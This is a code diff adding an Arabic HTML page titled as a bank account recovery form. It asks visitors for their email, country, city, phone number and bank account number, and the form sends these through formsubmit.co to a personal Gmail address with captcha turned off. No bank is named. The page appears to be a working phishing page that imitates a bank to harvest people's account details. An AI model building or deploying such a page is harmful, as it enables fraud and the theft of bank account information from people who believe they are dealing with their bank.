@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>استعادة حساب بنكي</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e9edf1;
+      color: #1a1a1a;
+    }
+
+    header {
+      background-color: #0a3d62;
+      padding: 15px 20px;
+      text-align: center;
+      color: #fff;
+      font-size: 22px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: 50px auto;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 25px 20px;
+    }
+
+    .container h2 {
+      font-size: 16px;
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+      line-height: 1.8;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    label {
+      font-weight: bold;
+      font-size: 14px;
+      color: #0a3d62;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #0a3d62;
+      box-shadow: 0 0 0 2px rgba(10, 61, 98, 0.15);
+      outline: none;
+    }
+
+    button {
+      background-color: #0a3d62;
+      color: #fff;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #07426b;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        margin: 30px 15px;
+        padding: 20px 15px;
+      }
+
+      header {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>Account Recover</header>
+
+  <div class="container">
+    <h2>
+      قم بكتابة معلومات حسابك وسيتم مراجعتها خلال مدة أقصاها ٢٤ ساعة.<br>
+      في حال كانت المعلومات صحيحة سيتم إرسال رابط عبر بريدك الإلكتروني يساعدك على تغيير كلمة مرورك.
+    </h2>
+
+    <form action="https://formsubmit.co/nsrmla09@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="طلب استعادة حساب بنكي">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" name="البريد الإلكتروني" required>
+
+      <label for="country">الدولة</label>
+      <input type="text" id="country" name="الدولة" required>
+
+      <label for="city">المدينة</label>
+      <input type="text" id="city" name="المدينة" required>
+
+      <label for="phone">رقم الهاتف</label>
+      <input type="tel" id="phone" name="رقم الهاتف" required>
+
+      <label for="account">رقم الحساب</label>
+      <input type="text" id="account" name="رقم الحساب" required>
+
+      <button type="submit">إرسال</button>
+    </form>
+  </div>
+
+</body>
+</html>
